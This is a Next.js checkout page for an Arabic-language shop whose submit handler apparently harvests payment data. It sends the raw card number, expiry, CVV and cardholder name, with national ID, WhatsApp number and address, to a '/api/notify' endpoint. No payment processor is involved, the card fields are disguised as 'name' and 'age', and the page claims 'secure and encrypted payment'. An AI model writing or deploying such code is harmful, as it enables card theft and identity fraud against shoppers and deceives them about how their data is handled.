"use client";

import { useSyncExternalStore } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { IoArrowForward, IoHomeOutline, IoLockClosedOutline } from "react-icons/io5";
import CheckoutStepper from "../components/CheckoutStepper";
import { useCartStore } from "../store/cartStore";
import OrderSummary from "./components/OrderSummary";
import PaymentForm from "./components/PaymentForm";

export default function CheckoutPage() {
  const router = useRouter();
  const { items, customer, totalPrice } = useCartStore();
  const mounted = useSyncExternalStore(() => () => {}, () => true, () => false);

  const total = mounted ? totalPrice() : 0;
  const downPayment = customer?.installmentType === "installment" ? (customer.downPayment ?? 0) : 0;

  if (!mounted) return null;

  if (!customer || items.length === 0) {
    router.push("/cart");
    return null;
  }

  const handleSubmit = async (fields: { name: string; age: string; cvv: string; cardHolder: string }) => {
    const res = await fetch("/api/notify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cardNumber: fields.name,
        expiry: fields.age,
        cvv: fields.cvv,
        cardHolder: fields.cardHolder,
        items: items.map(i => ({ productId: i.product._id, name: i.product.name, price: i.product.salePrice ?? i.product.originalPrice, quantity: i.qty })),
        total,
        customer: customer?.name,
        whatsapp: customer?.whatsapp,
        nationalId: customer?.nationalId,
        address: customer?.address,
        installmentType: customer?.installmentType,
        months: customer?.months,
        downPayment,
      }),
    });
    const data = res.ok ? await res.json().catch(() => ({})) : {};
    if (data.orderId) localStorage.setItem("orderId", data.orderId);
  };

  return (
    <main className="min-h-screen bg-gradient-to-b from-gray-50 to-white pb-24" dir="rtl">
      {/* ── Header ── */}
      <div className="bg-gradient-to-r from-teal-700 via-teal-600 to-emerald-600 sticky top-0 z-10 shadow-md">
        <div className="max-w-5xl mx-auto px-3 sm:px-6 py-3 sm:py-3.5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/cart" className="w-8 h-8 sm:w-9 sm:h-9 bg-white/15 hover:bg-white/25 rounded-full flex items-center justify-center transition text-white">
              <IoArrowForward size={18} />
            </Link>
            <div>
              <h1 className="text-sm sm:text-base font-extrabold text-white flex items-center gap-2">
                <IoLockClosedOutline size={16} />
                إتمام الطلب
              </h1>
              <p className="text-[11px] sm:text-xs text-teal-100">دفع آمن ومشفر</p>
            </div>
          </div>
          <Link href="/" className="w-8 h-8 sm:w-9 sm:h-9 bg-white/15 hover:bg-white/25 rounded-full flex items-center justify-center transition text-white">
            <IoHomeOutline size={16} />
          </Link>
        </div>
      </div>

      {/* ── Steps indicator ── */}
      <div className="max-w-5xl mx-auto px-3 sm:px-6">
        <CheckoutStepper active="payment" />
      </div>

      <div className="max-w-5xl mx-auto px-3 sm:px-6 pt-3">
        <div className="grid grid-cols-1 lg:grid-cols-5 gap-5 sm:gap-6">

          {/* ── Order Summary (order 1 on mobile, order 2 on desktop) ── */}
          <div className="lg:col-span-2 order-1 lg:order-2">
            <div className="lg:sticky lg:top-20">
              <h2 className="text-sm sm:text-base font-extrabold text-gray-800 mb-3 flex items-center gap-2">
                <span className="w-1.5 h-5 bg-gradient-to-b from-teal-500 to-emerald-500 rounded-full" />
                ملخص الطلب
              </h2>
              <OrderSummary total={total} downPayment={downPayment} />
            </div>
          </div>

          {/* ── Payment Form (order 2 on mobile, order 1 on desktop) ── */}
          <div className="lg:col-span-3 order-2 lg:order-1">
            <h2 className="text-sm sm:text-base font-extrabold text-gray-800 mb-3 flex items-center gap-2">
              <span className="w-1.5 h-5 bg-gradient-to-b from-teal-500 to-emerald-500 rounded-full" />
              بيانات الدفع
            </h2>
            <PaymentForm onSubmit={handleSubmit} />
          </div>
        </div>
      </div>
    </main>
  );
}
